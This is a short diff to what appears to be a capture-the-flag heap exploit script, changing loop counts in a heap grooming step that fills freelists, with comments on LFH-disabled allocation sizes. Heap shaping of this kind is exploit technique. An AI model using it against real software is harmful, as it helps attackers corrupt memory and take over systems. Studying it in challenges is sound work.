@@ -38,9 +38,9 @@ def edit(kind, name, s):
 ## defragment freelist
 # it seems that size > 0x200 is `safe` (LFH-disabled)
 # ps. the vector size is expanded as [0x40,0x70,0xa0,0xd0,0x130,0x130,0x1c0*3,0x280*4,0x3a0,...,0x550,...]
-for i in range(9):
+for i in range(10):
   create(1, '1', 'teacher', '1', 'subject')
-for i in range(9):
+for i in range(10):
   create(1, '1', 'doctor', '1', 'hospital')
 for i in range(10):
   create(1, '1', 'athlete', '1', 'sport')
